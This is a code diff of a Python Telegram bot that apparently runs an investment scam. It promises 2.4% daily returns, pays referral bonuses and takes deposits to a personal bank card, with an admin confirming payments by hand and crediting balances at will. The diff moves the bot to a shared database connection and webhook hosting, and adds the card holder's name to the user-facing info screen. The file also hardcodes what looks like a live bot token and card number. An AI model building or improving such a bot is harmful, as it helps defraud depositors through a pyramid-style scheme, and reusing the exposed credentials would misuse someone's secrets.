@@ -1,9 +1,12 @@
 import asyncio
 import logging
+import os
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
+from aiohttp import web
 import aiosqlite
 import re
 
@@ -12,30 +15,54 @@ TOKEN = "8587086312:AAE9jbbaPZBzU-niDmOK7uhHhpCYSvf_BoU"
 ADMIN_ID = 7603296347
 SUPPORT_USERNAME = "WWWMMMZZZwq"
 CARD_NUMBER = "2200 7012 3329 6489"
-CARD_HOLDER = "Леонид Кулёв"
+CARD_HOLDER = "Леонид К."  # ✅ ИЗМЕНИЛ
 
 # Проценты и лимиты
-INTEREST_RATE = 0.024           # 2,4% в сутки
-INTERVAL_HOURS = 24             # Раз в 24 часа
-MIN_DEPOSIT = 100              # Минимальное пополнение
-MIN_WITHDRAW = 500             # Минимальный вывод 500₽
-MIN_INVEST = 100              # Минимальный запуск в работу
+INTEREST_RATE = 0.024
+INTERVAL_HOURS = 24
+MIN_DEPOSIT = 100
+MIN_WITHDRAW = 500
+MIN_INVEST = 100
 
 # Бонусы
 WELCOME_BONUS = 15
 REFERRAL_REG_BONUS = 15
 REFERRAL_DEPOSIT_BONUS = 0.05
 
-# Канал выплат (вставь свой ID после создания)
-PAYOUT_CHANNEL_ID = None  # Например: -1001234567890
+# Канал выплат (вставь свой ID)
+PAYOUT_CHANNEL_ID = None
 PAYOUT_CHANNEL_USERNAME = "@moneydrip_payouts"
 SHOW_WITHDRAW_IN_CHANNEL = True
-# ================================
+
+# ========== НАСТРОЙКИ RENDER ==========
+RENDER_EXTERNAL_URL = os.environ.get('RENDER_EXTERNAL_URL')
+PORT = int(os.environ.get('PORT', 10000))
+WEBHOOK_PATH = f'/webhook/{TOKEN}'
+if RENDER_EXTERNAL_URL:
+    WEBHOOK_URL = f'{RENDER_EXTERNAL_URL}{WEBHOOK_PATH}'
+else:
+    WEBHOOK_URL = None
+# ========================================
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
-# === ПАРСИНГ ЧИСЕЛ (100k = 100000) ===
+# === ЕДИНОЕ ПОДКЛЮЧЕНИЕ К БД ===
+db_pool = None
+
+async def get_db():
+    global db_pool
+    if db_pool is None:
+        db_pool = await aiosqlite.connect("users.db", timeout=30)
+    return db_pool
+
+async def close_db():
+    global db_pool
+    if db_pool:
+        await db_pool.close()
+        db_pool = None
+
+# === ПАРСИНГ ЧИСЕЛ ===
 def parse_amount(text: str) -> float:
     text = text.lower().replace(" ", "").replace(",", ".")
     if "k" in text:
@@ -73,42 +100,42 @@ async def send_to_payout_channel(user_id: int, amount: float, card_last: str = "
 
 # === БАЗА ДАННЫХ ===
 async def init_db():
-    async with aiosqlite.connect("users.db") as db:
-        await db.execute("""
-            CREATE TABLE IF NOT EXISTS users (
-                user_id INTEGER PRIMARY KEY,
-                balance REAL DEFAULT 0,
-                invest_sum REAL DEFAULT 0,
-                last_interest TEXT,
-                deposit_request REAL DEFAULT 0,
-                withdraw_request REAL DEFAULT 0,
-                card_number TEXT DEFAULT '',
-                referrer_id INTEGER DEFAULT 0,
-                referral_earnings REAL DEFAULT 0,
-                welcome_bonus_claimed INTEGER DEFAULT 0,
-                created_at TEXT DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        await db.execute("""
-            CREATE TABLE IF NOT EXISTS history (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                type TEXT,
-                amount REAL,
-                status TEXT,
-                details TEXT,
-                created_at TEXT DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        await db.commit()
+    db = await get_db()
+    await db.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            balance REAL DEFAULT 0,
+            invest_sum REAL DEFAULT 0,
+            last_interest TEXT,
+            deposit_request REAL DEFAULT 0,
+            withdraw_request REAL DEFAULT 0,
+            card_number TEXT DEFAULT '',
+            referrer_id INTEGER DEFAULT 0,
+            referral_earnings REAL DEFAULT 0,
+            welcome_bonus_claimed INTEGER DEFAULT 0,
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+    await db.execute("""
+        CREATE TABLE IF NOT EXISTS history (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            type TEXT,
+            amount REAL,
+            status TEXT,
+            details TEXT,
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+    await db.commit()
 
 async def add_history(user_id: int, type: str, amount: float, status: str = "completed", details: str = ""):
-    async with aiosqlite.connect("users.db") as db:
-        await db.execute(
-            "INSERT INTO history (user_id, type, amount, status, details) VALUES (?, ?, ?, ?, ?)",
-            (user_id, type, amount, status, details)
-        )
-        await db.commit()
+    db = await get_db()
+    await db.execute(
+        "INSERT INTO history (user_id, type, amount, status, details) VALUES (?, ?, ?, ?, ?)",
+        (user_id, type, amount, status, details)
+    )
+    await db.commit()
 
 # === СТАРТ ===
 @dp.message(Command("start"))
@@ -116,47 +143,50 @@ async def cmd_start(message: Message):
     user_id = message.from_user.id
     args = message.text.split()
     
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute("SELECT user_id, welcome_bonus_claimed FROM users WHERE user_id = ?", (user_id,))
-        user = await cursor.fetchone()
-        is_new = user is None
-        
-        if is_new:
-            await db.execute(
-                "INSERT INTO users (user_id, balance, welcome_bonus_claimed) VALUES (?, ?, 1)",
-                (user_id, WELCOME_BONUS)
-            )
-            await add_history(user_id, "welcome_bonus", WELCOME_BONUS, "completed", "Приветственный бонус")
-            
-            await message.answer(
-                f"🎁 *Вам начислен приветственный бонус!*\n"
-                f"💰 +{WELCOME_BONUS}₽ на баланс",
-                parse_mode="Markdown"
-            )
-        else:
-            await db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
-        
-        if len(args) > 1 and args[1].startswith("ref") and is_new:
-            referrer_id = int(args[1].replace("ref", ""))
-            if referrer_id != user_id:
-                await db.execute("UPDATE users SET referrer_id = ? WHERE user_id = ?", (referrer_id, user_id))
-                await db.execute(
-                    "UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?",
-                    (REFERRAL_REG_BONUS, REFERRAL_REG_BONUS, referrer_id)
-                )
-                await add_history(referrer_id, "referral_bonus", REFERRAL_REG_BONUS, "completed", 
-                                f"Бонус за реферала {user_id}")
-                
-                try:
-                    await bot.send_message(
-                        referrer_id,
-                        f"🎁 *Новый реферал!*\n\n+{REFERRAL_REG_BONUS}₽ на баланс",
-                        parse_mode="Markdown"
-                    )
-                except:
-                    pass
-        
+    db = await get_db()
+    cursor = await db.execute("SELECT user_id, welcome_bonus_claimed FROM users WHERE user_id = ?", (user_id,))
+    user = await cursor.fetchone()
+    is_new = user is None
+    
+    if is_new:
+        await db.execute(
+            "INSERT INTO users (user_id, balance, welcome_bonus_claimed) VALUES (?, ?, 1)",
+            (user_id, WELCOME_BONUS)
+        )
         await db.commit()
+        await add_history(user_id, "welcome_bonus", WELCOME_BONUS, "completed", "Приветственный бонус")
+        
+        await message.answer(
+            f"🎁 *Вам начислен приветственный бонус!*\n"
+            f"💰 +{WELCOME_BONUS}₽ на баланс",
+            parse_mode="Markdown"
+        )
+    else:
+        await db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
+        await db.commit()
+    
+    if len(args) > 1 and args[1].startswith("ref") and is_new:
+        referrer_id = int(args[1].replace("ref", ""))
+        if referrer_id != user_id:
+            await db.execute("UPDATE users SET referrer_id = ? WHERE user_id = ?", (referrer_id, user_id))
+            await db.commit()
+            
+            await db.execute(
+                "UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?",
+                (REFERRAL_REG_BONUS, REFERRAL_REG_BONUS, referrer_id)
+            )
+            await db.commit()
+            await add_history(referrer_id, "referral_bonus", REFERRAL_REG_BONUS, "completed", 
+                            f"Бонус за реферала {user_id}")
+            
+            try:
+                await bot.send_message(
+                    referrer_id,
+                    f"🎁 *Новый реферал!*\n\n+{REFERRAL_REG_BONUS}₽ на баланс",
+                    parse_mode="Markdown"
+                )
+            except:
+                pass
     
     ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
     
@@ -183,52 +213,19 @@ async def cmd_start(message: Message):
         reply_markup=keyboard
     )
 
-# === ОТВЕТ НА ЛЮБОЙ ТЕКСТ ===
-@dp.message()
-async def handle_all_messages(message: Message):
-    text = message.text
-    
-    if text.startswith('/start'):
-        return
-    
-    if re.match(r'^[\d\.]+[km]?$', text.lower().replace(" ", "")):
-        await process_deposit(message)
-        return
-    
-    if text.lower().startswith('*'):
-        await process_multiply(message)
-        return
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 Запустить в работу", callback_data="multiply")],
-        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
-         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
-        [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back_to_menu")]
-    ])
-    
-    await message.answer(
-        "❓ *Я не понял команду*\n\n"
-        "📌 *Что ты можешь сделать:*\n"
-        f"• Введи число — пополнить от {MIN_DEPOSIT}₽\n"
-        "• Введи *число — запустить деньги в работу\n"
-        "• Используй кнопки ниже 👇",
-        parse_mode="Markdown",
-        reply_markup=keyboard
-    )
-
 # === БАЛАНС + ПРОГНОЗ ===
 @dp.callback_query(lambda c: c.data == "balance")
 async def show_balance(call: CallbackQuery):
     user_id = call.from_user.id
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute(
-            "SELECT balance, invest_sum, referral_earnings FROM users WHERE user_id = ?",
-            (user_id,)
-        )
-        row = await cursor.fetchone()
-        balance = row[0] if row else 0
-        invest = row[1] if row else 0
-        ref_earnings = row[2] if row else 0
+    db = await get_db()
+    cursor = await db.execute(
+        "SELECT balance, invest_sum, referral_earnings FROM users WHERE user_id = ?",
+        (user_id,)
+    )
+    row = await cursor.fetchone()
+    balance = row[0] if row else 0
+    invest = row[1] if row else 0
+    ref_earnings = row[2] if row else 0
     
     profit_week = calculate_profit(invest, 7)
     profit_month = calculate_profit(invest, 30)
@@ -243,8 +240,8 @@ async def show_balance(call: CallbackQuery):
         f"📈 В работе: `{invest:,.0f}₽`\n"
         f"🎁 Реферальные: `{ref_earnings:,.0f}₽`\n\n"
         f"📅 *Прогноз дохода:*\n"
-        f"• Через неделю: `+{profit_week:,.0f}₽` (2,4% × 7)\n"
-        f"• Через месяц: `+{profit_month:,.0f}₽` (2,4% × 30)\n\n"
+        f"• Через неделю: `+{profit_week:,.0f}₽`\n"
+        f"• Через месяц: `+{profit_month:,.0f}₽`\n\n"
         f"⏳ Каждые 24 часа +2,4% 🔥",
         parse_mode="Markdown",
         reply_markup=keyboard
@@ -255,14 +252,14 @@ async def show_balance(call: CallbackQuery):
 async def show_referrals(call: CallbackQuery):
     user_id = call.from_user.id
     
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,))
-        ref_count = await cursor.fetchone()
-        ref_count = ref_count[0] if ref_count else 0
-        
-        cursor = await db.execute("SELECT referral_earnings FROM users WHERE user_id = ?", (user_id,))
-        row = await cursor.fetchone()
-        ref_earnings = row[0] if row else 0
+    db = await get_db()
+    cursor = await db.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,))
+    ref_count_row = await cursor.fetchone()
+    ref_count = ref_count_row[0] if ref_count_row else 0
+    
+    cursor = await db.execute("SELECT referral_earnings FROM users WHERE user_id = ?", (user_id,))
+    earnings_row = await cursor.fetchone()
+    ref_earnings = earnings_row[0] if earnings_row else 0
     
     ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
     
@@ -290,12 +287,12 @@ async def show_referrals(call: CallbackQuery):
 async def show_history(call: CallbackQuery):
     user_id = call.from_user.id
     
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute(
-            "SELECT type, amount, status, created_at FROM history WHERE user_id = ? ORDER BY created_at DESC LIMIT 10",
-            (user_id,)
-        )
-        history_rows = await cursor.fetchall()
+    db = await get_db()
+    cursor = await db.execute(
+        "SELECT type, amount, status, created_at FROM history WHERE user_id = ? ORDER BY created_at DESC LIMIT 10",
+        (user_id,)
+    )
+    history_rows = await cursor.fetchall()
     
     if not history_rows:
         text = "📊 *ИСТОРИЯ ОПЕРАЦИЙ*\n\nУ тебя пока нет операций."
@@ -358,6 +355,7 @@ async def i_paid(call: CallbackQuery):
         reply_markup=keyboard
     )
 
+@dp.message(lambda m: m.text and re.match(r'^[\d\.]+[km]?$', m.text.lower().replace(" ", "")))
 async def process_deposit(message: Message):
     user_id = message.from_user.id
     
@@ -371,14 +369,14 @@ async def process_deposit(message: Message):
         await message.answer(f"❌ Минимальная сумма — {MIN_DEPOSIT} ₽")
         return
     
-    async with aiosqlite.connect("users.db") as db:
-        await db.execute("UPDATE users SET deposit_request = ? WHERE user_id = ?", (amount, user_id))
-        await db.commit()
-        await add_history(user_id, "deposit", amount, "pending", "Заявка на пополнение")
-        
-        cursor = await db.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
-        row = await cursor.fetchone()
-        referrer_id = row[0] if row else 0
+    db = await get_db()
+    await db.execute("UPDATE users SET deposit_request = ? WHERE user_id = ?", (amount, user_id))
+    await db.commit()
+    await add_history(user_id, "deposit", amount, "pending", "Заявка на пополнение")
+    
+    cursor = await db.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
+    row = await cursor.fetchone()
+    referrer_id = row[0] if row else 0
     
     await bot.send_message(
         ADMIN_ID,
@@ -410,43 +408,44 @@ async def confirm_deposit(message: Message):
         await message.answer("Используй: /confirm 123456789")
         return
     
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute(
-            "SELECT deposit_request, referrer_id FROM users WHERE user_id = ?",
-            (user_id,)
-        )
-        row = await cursor.fetchone()
-        if not row or row[0] == 0:
-            await message.answer("❌ Нет активных заявок")
-            return
-        
-        amount = row[0]
-        referrer_id = row[1]
-        
+    db = await get_db()
+    cursor = await db.execute(
+        "SELECT deposit_request, referrer_id FROM users WHERE user_id = ?",
+        (user_id,)
+    )
+    row = await cursor.fetchone()
+    if not row or row[0] == 0:
+        await message.answer("❌ Нет активных заявок")
+        return
+    
+    amount = row[0]
+    referrer_id = row[1]
+    
+    await db.execute(
+        "UPDATE users SET balance = balance + ?, deposit_request = 0 WHERE user_id = ?",
+        (amount, user_id)
+    )
+    await db.commit()
+    
+    if referrer_id and referrer_id != 0:
+        bonus = amount * REFERRAL_DEPOSIT_BONUS
         await db.execute(
-            "UPDATE users SET balance = balance + ?, deposit_request = 0 WHERE user_id = ?",
-            (amount, user_id)
+            "UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?",
+            (bonus, bonus, referrer_id)
         )
-        
-        if referrer_id and referrer_id != 0:
-            bonus = amount * REFERRAL_DEPOSIT_BONUS
-            await db.execute(
-                "UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?",
-                (bonus, bonus, referrer_id)
-            )
-            await add_history(referrer_id, "referral", bonus, "completed", f"Бонус за реферала {user_id}")
-            
-            try:
-                await bot.send_message(
-                    referrer_id,
-                    f"🎁 *Реферальный бонус!*\n+{bonus:,.0f}₽ (5%)",
-                    parse_mode="Markdown"
-                )
-            except:
-                pass
-        
         await db.commit()
-        await add_history(user_id, "deposit", amount, "completed", "Пополнение подтверждено")
+        await add_history(referrer_id, "referral", bonus, "completed", f"Бонус за реферала {user_id}")
+        
+        try:
+            await bot.send_message(
+                referrer_id,
+                f"🎁 *Реферальный бонус!*\n+{bonus:,.0f}₽ (5%)",
+                parse_mode="Markdown"
+            )
+        except:
+            pass
+    
+    await add_history(user_id, "deposit", amount, "completed", "Пополнение подтверждено")
     
     await message.answer(f"✅ Баланс {user_id} пополнен на {amount:,.0f}₽")
     await bot.send_message(
@@ -474,6 +473,7 @@ async def multiply_start(call: CallbackQuery):
         reply_markup=keyboard
     )
 
+@dp.message(lambda m: m.text and m.text.lower().startswith('*'))
 async def process_multiply(message: Message):
     user_id = message.from_user.id
     text = message.text.replace('*', '').strip()
@@ -484,25 +484,25 @@ async def process_multiply(message: Message):
         await message.answer("❌ Используй: *500, *1.5k, *2K")
         return
     
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
-        row = await cursor.fetchone()
-        balance = row[0] if row else 0
-        
-        if amount > balance:
-            await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
-            return
-        
-        if amount < MIN_INVEST:
-            await message.answer(f"❌ Минимум {MIN_INVEST}₽")
-            return
-        
-        await db.execute(
-            "UPDATE users SET balance = balance - ?, invest_sum = invest_sum + ?, last_interest = ? WHERE user_id = ?",
-            (amount, amount, datetime.now().isoformat(), user_id)
-        )
-        await db.commit()
-        await add_history(user_id, "invest", amount, "completed", "Запуск в работу")
+    db = await get_db()
+    cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
+    row = await cursor.fetchone()
+    balance = row[0] if row else 0
+    
+    if amount > balance:
+        await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
+        return
+    
+    if amount < MIN_INVEST:
+        await message.answer(f"❌ Минимум {MIN_INVEST}₽")
+        return
+    
+    await db.execute(
+        "UPDATE users SET balance = balance - ?, invest_sum = invest_sum + ?, last_interest = ? WHERE user_id = ?",
+        (amount, amount, datetime.now().isoformat(), user_id)
+    )
+    await db.commit()
+    await add_history(user_id, "invest", amount, "completed", "Запуск в работу")
     
     profit_week = calculate_profit(amount, 7)
     profit_month = calculate_profit(amount, 30)
@@ -517,32 +517,32 @@ async def process_multiply(message: Message):
         parse_mode="Markdown"
     )
 
-# === ПРОЦЕНТЫ КАЖДЫЕ 24 ЧАСА ===
+# === ПРОЦЕНТЫ (КАЖДЫЕ 24 ЧАСА) ===
 async def interest_worker():
     while True:
         await asyncio.sleep(INTERVAL_HOURS * 3600)
-        async with aiosqlite.connect("users.db") as db:
-            cursor = await db.execute("SELECT user_id, invest_sum FROM users WHERE invest_sum > 0")
-            users = await cursor.fetchall()
-            for user_id, invest in users:
-                profit = invest * INTEREST_RATE
-                await db.execute(
-                    "UPDATE users SET invest_sum = invest_sum + ? WHERE user_id = ?",
-                    (profit, user_id)
+        db = await get_db()
+        cursor = await db.execute("SELECT user_id, invest_sum FROM users WHERE invest_sum > 0")
+        users = await cursor.fetchall()
+        for user_id, invest in users:
+            profit = invest * INTEREST_RATE
+            await db.execute(
+                "UPDATE users SET invest_sum = invest_sum + ? WHERE user_id = ?",
+                (profit, user_id)
+            )
+            await add_history(user_id, "interest", profit, "completed", "Начисление 2,4%")
+            try:
+                await bot.send_message(
+                    user_id,
+                    f"📈 *НАЧИСЛЕНИЕ ПРОЦЕНТОВ*\n\n"
+                    f"➕ +{profit:,.2f}₽\n"
+                    f"💰 В работе: {invest + profit:,.2f}₽\n\n"
+                    f"⏳ Следующее через 24ч",
+                    parse_mode="Markdown"
                 )
-                await add_history(user_id, "interest", profit, "completed", "Начисление 2,4%")
-                try:
-                    await bot.send_message(
-                        user_id,
-                        f"📈 *НАЧИСЛЕНИЕ ПРОЦЕНТОВ*\n\n"
-                        f"➕ +{profit:,.2f}₽\n"
-                        f"💰 В работе: {invest + profit:,.2f}₽\n\n"
-                        f"⏳ Следующее через 24ч",
-                        parse_mode="Markdown"
-                    )
-                except:
-                    pass
-            await db.commit()
+            except:
+                pass
+        await db.commit()
 
 # === ВЫВОД СРЕДСТВ ===
 @dp.callback_query(lambda c: c.data == "withdraw")
@@ -578,21 +578,21 @@ async def process_withdraw(message: Message):
         await message.answer(f"❌ Минимум {MIN_WITHDRAW}₽")
         return
     
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
-        row = await cursor.fetchone()
-        balance = row[0] if row else 0
-        
-        if amount > balance:
-            await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
-            return
-        
-        await db.execute(
-            "UPDATE users SET withdraw_request = ?, card_number = ? WHERE user_id = ?",
-            (amount, card_number, user_id)
-        )
-        await db.commit()
-        await add_history(user_id, "withdraw", amount, "pending", f"Заявка, карта: {card_number[-4:]}")
+    db = await get_db()
+    cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
+    row = await cursor.fetchone()
+    balance = row[0] if row else 0
+    
+    if amount > balance:
+        await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
+        return
+    
+    await db.execute(
+        "UPDATE users SET withdraw_request = ?, card_number = ? WHERE user_id = ?",
+        (amount, card_number, user_id)
+    )
+    await db.commit()
+    await add_history(user_id, "withdraw", amount, "pending", f"Заявка, карта: {card_number[-4:]}")
     
     await bot.send_message(
         ADMIN_ID,
@@ -623,25 +623,25 @@ async def confirm_withdraw(message: Message):
         await message.answer("Используй: /withdraw 123456789")
         return
     
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute(
-            "SELECT withdraw_request, card_number FROM users WHERE user_id = ?",
-            (user_id,)
-        )
-        row = await cursor.fetchone()
-        if not row or row[0] == 0:
-            await message.answer("❌ Нет заявок")
-            return
-        
-        amount = row[0]
-        card = row[1]
-        
-        await db.execute(
-            "UPDATE users SET balance = balance - ?, withdraw_request = 0 WHERE user_id = ?",
-            (amount, user_id)
-        )
-        await db.commit()
-        await add_history(user_id, "withdraw", amount, "completed", f"Вывод, карта: {card[-4:]}")
+    db = await get_db()
+    cursor = await db.execute(
+        "SELECT withdraw_request, card_number FROM users WHERE user_id = ?",
+        (user_id,)
+    )
+    row = await cursor.fetchone()
+    if not row or row[0] == 0:
+        await message.answer("❌ Нет заявок")
+        return
+    
+    amount = row[0]
+    card = row[1]
+    
+    await db.execute(
+        "UPDATE users SET balance = balance - ?, withdraw_request = 0 WHERE user_id = ?",
+        (amount, user_id)
+    )
+    await db.commit()
+    await add_history(user_id, "withdraw", amount, "completed", f"Вывод, карта: {card[-4:]}")
     
     await send_to_payout_channel(user_id, amount, card[-4:])
     
@@ -684,7 +684,7 @@ async def support(call: CallbackQuery):
     ])
     
     await call.message.edit_text(
-        f"🛡 *ПОДДЕРЖКА*\n\n@ {SUPPORT_USERNAME}\n⏱ 5-15 минут",
+        f"🛡 *ПОДДЕРЖКА*\n\n@{SUPPORT_USERNAME}\n⏱ 5-15 минут",
         parse_mode="Markdown",
         reply_markup=keyboard
     )
@@ -706,6 +706,7 @@ async def info(call: CallbackQuery):
         f"• +15₽ за реферала\n"
         f"• +5% с пополнений друзей\n\n"
         f"💳 Карта: Т‑Банк\n"
+        f"👤 Получатель: {CARD_HOLDER}\n"
         f"✅ Работаем с 2024",
         parse_mode="Markdown",
         reply_markup=keyboard
@@ -730,10 +731,10 @@ async def add_balance(message: Message):
         await message.answer("Используй: /add 123456789 1000")
         return
     
-    async with aiosqlite.connect("users.db") as db:
-        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
-        await db.commit()
-        await add_history(user_id, "admin", amount, "completed", "Начислено админом")
+    db = await get_db()
+    await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
+    await db.commit()
+    await add_history(user_id, "admin", amount, "completed", "Начислено админом")
     
     await message.answer(f"✅ Баланс {user_id} +{amount:,.0f}₽")
     await bot.send_message(user_id, f"💰 Вам начислено {amount:,.0f}₽!")
@@ -744,18 +745,18 @@ async def stats(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
     
-    async with aiosqlite.connect("users.db") as db:
-        cursor = await db.execute("SELECT COUNT(*) FROM users")
-        total_users = (await cursor.fetchone())[0]
-        
-        cursor = await db.execute("SELECT SUM(balance) FROM users")
-        total_balance = (await cursor.fetchone())[0] or 0
-        
-        cursor = await db.execute("SELECT SUM(invest_sum) FROM users")
-        total_invest = (await cursor.fetchone())[0] or 0
-        
-        cursor = await db.execute("SELECT COUNT(*) FROM history WHERE status = 'pending'")
-        pending = (await cursor.fetchone())[0] or 0
+    db = await get_db()
+    cursor = await db.execute("SELECT COUNT(*) FROM users")
+    total_users = (await cursor.fetchone())[0]
+    
+    cursor = await db.execute("SELECT SUM(balance) FROM users")
+    total_balance = (await cursor.fetchone())[0] or 0
+    
+    cursor = await db.execute("SELECT SUM(invest_sum) FROM users")
+    total_invest = (await cursor.fetchone())[0] or 0
+    
+    cursor = await db.execute("SELECT COUNT(*) FROM history WHERE status = 'pending'")
+    pending = (await cursor.fetchone())[0] or 0
     
     await message.answer(
         f"📊 *СТАТИСТИКА*\n\n"
@@ -799,12 +800,36 @@ async def back_to_menu(call: CallbackQuery):
         reply_markup=keyboard
     )
 
-# === ЗАПУСК ===
-async def main():
-    logging.basicConfig(level=logging.INFO)
+# === ЗАПУСК ЧЕРЕЗ ВЕБХУКИ ===
+async def on_startup():
+    """Действия при старте"""
+    if WEBHOOK_URL:
+        await bot.set_webhook(WEBHOOK_URL, allowed_updates=dp.resolve_used_update_types())
     await init_db()
     asyncio.create_task(interest_worker())
-    await dp.start_polling(bot)
 
-if __name__ == "__main__":
-    asyncio.run(main())
+async def on_shutdown():
+    """Действия при остановке"""
+    await bot.delete_webhook()
+    await close_db()
+
+def main():
+    """Запуск через aiohttp"""
+    app = web.Application()
+    
+    dp.startup.register(on_startup)
+    dp.shutdown.register(on_shutdown)
+    
+    if WEBHOOK_URL:
+        webhook_handler = SimpleRequestHandler(
+            dispatcher=dp,
+            bot=bot,
+        )
+        webhook_handler.register(app, path=WEBHOOK_PATH)
+        setup_application(app, dp, bot=bot)
+    
+    web.run_app(app, host='0.0.0.0', port=PORT)
+
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.INFO)
+    main()
